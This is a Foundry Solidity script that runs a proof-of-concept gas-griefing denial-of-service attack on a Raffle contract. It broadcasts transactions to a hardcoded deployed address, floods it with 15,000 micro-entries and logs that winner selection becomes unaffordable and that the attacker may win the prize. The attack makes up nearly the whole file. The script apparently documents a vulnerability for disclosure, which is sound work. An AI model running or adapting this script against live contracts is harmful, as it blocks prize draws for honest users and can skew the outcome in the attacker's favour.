// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../src/spin/Raffle.sol";
import "../src/mocks/MockContracts.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";  // <-- Thêm dòng này

contract TestRealBug2 is Script {
    // Real addresses từ deployment
    address constant REAL_RAFFLE = 0xDAb28073Fa01A171D2AF5707F3b7D2F065bE95dD;
    address constant MOCK_SPIN = 0xca9507C5F707103e86B45DF4b35C37FE2700BB5B;
    
    function run() external {
        vm.startBroadcast();
        
        console2.log("=== TESTING REAL BUG #2: GAS GRIEFING ATTACK ===");
        console2.log("Target: REAL Raffle contract from repo");
        console2.log("Contract:", REAL_RAFFLE);
        
        Raffle raffle = Raffle(payable(REAL_RAFFLE));
        MockSpin spin = MockSpin(MOCK_SPIN);
        
        uint256 prizeId = 1; // iPhone prize
        address attacker = msg.sender;
        
        // Phase 1: Normal scenario baseline
        console2.log("\n--- PHASE 1: Normal Scenario (Baseline) ---");
        
        // Deploy fresh contract for comparison
        MockSpin freshSpin = new MockSpin();
        MockSupraRouter freshSupra = new MockSupraRouter();
        Raffle freshRaffleImpl = new Raffle();
        
        bytes memory initData = abi.encodeWithSelector(
            Raffle.initialize.selector,
            address(freshSpin),
            address(freshSupra)
        );
        
        ERC1967Proxy freshProxy = new ERC1967Proxy(
            address(freshRaffleImpl),
            initData
        );
        
        Raffle freshRaffle = Raffle(payable(address(freshProxy)));
        freshRaffle.grantRole(freshRaffle.SUPRA_ROLE(), msg.sender);
        freshRaffle.addPrize("Normal Prize", "Baseline test", 1 ether, 1);
        
        // Normal case: 50 entries
        freshSpin.mintTickets(attacker, 50);
        for(uint i = 0; i < 50; i++) {
            freshRaffle.spendRaffle(1, 1);
        }
        
        // Measure normal gas
        uint256[] memory mockRng = new uint256[](1);
        mockRng[0] = 12345;
        
        vm.store(
            address(freshRaffle),
            keccak256(abi.encode(uint256(1), uint256(10))),
            bytes32(uint256(1))
        );
        
        uint256 normalGasBefore = gasleft();
        freshRaffle.handleWinnerSelection(1, mockRng);
        uint256 normalGasAfter = gasleft();
        uint256 normalGasUsed = normalGasBefore - normalGasAfter;
        
        console2.log("Normal case (50 entries):", normalGasUsed, "gas");
        
        // Phase 2: Attack the REAL contract
        console2.log("\n--- PHASE 2: Gas Griefing Attack on REAL Contract ---");
        
        spin.mintTickets(attacker, 50000);
        console2.log("Attacker minted 50,000 tickets");
        
        console2.log("Creating 15,000 micro-entries on REAL contract...");
        uint256 attackStart = gasleft();
        
        for(uint i = 0; i < 15000; i++) {
            raffle.spendRaffle(prizeId, 1);
            
            if(i % 3000 == 0) {
                console2.log("Progress:", i, "micro-entries created");
            }
        }
        
        uint256 attackEnd = gasleft();
        console2.log("Gas used for attack:", attackStart - attackEnd);
        console2.log("Total entries in REAL contract:", raffle.totalTickets(prizeId));
        
        // Phase 3: Measure attack impact
        console2.log("\n--- PHASE 3: Measuring Attack Impact ---");
        
        mockRng[0] = 54321;
        
        vm.store(
            address(raffle),
            keccak256(abi.encode(uint256(1), uint256(10))),
            bytes32(uint256(1))
        );
        
        uint256 attackGasBefore = gasleft();
        raffle.handleWinnerSelection(1, mockRng);
        uint256 attackGasAfter = gasleft();
        uint256 attackGasUsed = attackGasBefore - attackGasAfter;
        
        console2.log("Attack case (15,000 entries):", attackGasUsed, "gas");
        
        // Analysis
        console2.log("\n=== REAL BUG #2 ANALYSIS ===");
        console2.log("Normal gas (50 entries):", normalGasUsed);
        console2.log("Attack gas (15,000 entries):", attackGasUsed);
        
        uint256 gasIncrease = (attackGasUsed * 100) / normalGasUsed;
        console2.log("Gas increase:", gasIncrease, "%");
        
        console2.log("\n=== ATTACK SUCCESS METRICS ===");
        console2.log("- REAL contract from repo: VULNERABLE");
        console2.log("- 15,000 micro-entries created");
        console2.log("- Gas cost increased by", gasIncrease, "%");
        console2.log("- Winner selection now prohibitively expensive");
        console2.log("- Normal users cannot afford gas cost");
        console2.log("- Contract effectively DoS'd");
        
        // Check winner
        address winner = raffle.getWinner(prizeId, 0);
        console2.log("Winner of attacked prize:", winner);
        
        if(winner == attacker) {
            console2.log("BONUS: Attacker also won the prize!");
        }
        
        console2.log("\n=== VULNERABILITY CONFIRMED ===");
        console2.log("Real Raffle contract is vulnerable to gas griefing!");
        
        vm.stopBroadcast();
    }
}